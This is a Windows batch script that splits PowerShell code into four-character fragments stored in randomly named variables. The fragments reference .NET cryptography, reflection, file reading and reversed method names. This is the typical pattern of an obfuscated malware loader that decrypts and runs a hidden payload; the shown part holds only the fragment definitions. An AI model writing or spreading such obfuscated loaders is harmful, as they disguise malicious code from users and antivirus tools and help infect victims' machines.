@echo off
set "CzNLFAKoWb=oArr"
set "CLTZkzONrj= [Sy"
set "NnGxzztNxX=File"
set "LheVQkxhNX=tsWi"
set "sEFoFmjoMx=rity"
set "TAGcIuSRLG=raph"
set "ABcJNATaXt=e]::"
set "RcbsLmRdyb=pDZz"
set "QqdKQCmqdA=Kuq."
set "dOfhMVXYsT=('%*'"
set "foyaMEKwvS=j.Su"
set "sMtwANweiK=();$"
set "lLGUblXHPI= '')"
set "QLQmKNLDgt=se()"
set "XSKYGxVSsX=w = "
set "wnMOMKUcMd=Comp"
set "TJzoxAFoak=rofi"
set "pibuvOdzYP=daeR"
set "zJqWLHcTDb=esMa"
set "xDSMSLVAsK= New"
set "bAfCSwagxX=Bmor"
set "vNszIWkBsS=);$X"
set "XrjYhgxWeu=ach "
set "KjFaPZJTCd=ddin"
set "mfbjIXXFgS=em.I"
set "rQUZKSCzll=);$W"
set "PzXMHDTiDO='gni"
set "xyrwfkfUYA=ment"
set "xfedVTenro=tem."
set "HkrQxNLSVX=:: '"
set "PCTFWVgHdw=Itj."
set "DTGcUOjbEu=lit("
set "SOGvTXNeIr=;$eg"
set "bcYklmfLuA=ct S"
set "bUuOoPWTuh=flec"
set "WXScEkQGJS=.Sec"
set "zQiyVIVzsp=stem"
set "ZlcUhqYpRG=gnir"
set "PZrQtIyYOM=)) {"
set "hOGcIJltyL=ing("
set "HqRnmzzutq=vj0m"
set "zilWtNJlsp=ct S"
set "SKSJmmZweW=rtS4"
set "vWhYHTfSEA=oint"
set "KGEpsVUDTK=[]] "
set "jSWbnlYARR=);$O"
set "DskyRWsWUN=.Cre"
set "ozTGwaYzmV=ecry"
set "ETusabrnWy=Fo7l"
set "iTcIAPkBAk=yTo("
set "idBOTDuknA=XsIk"
set "aCQeGqxSnb=O.Me"
set "tQFtXyrAOw=.Cry"
set "EuXqzBcYjv=.IO."
set "MUZIlAKgmN=em.C"
set "TraLnPjRKM='')("
set "jwEKKqGwDE=yjd "
set "nESTpavAwv=Syst"
set "RraPTlHGHK=null"
set "pIbTbPAQAj=ptog"
set "yFmPiBiTQr= = $"
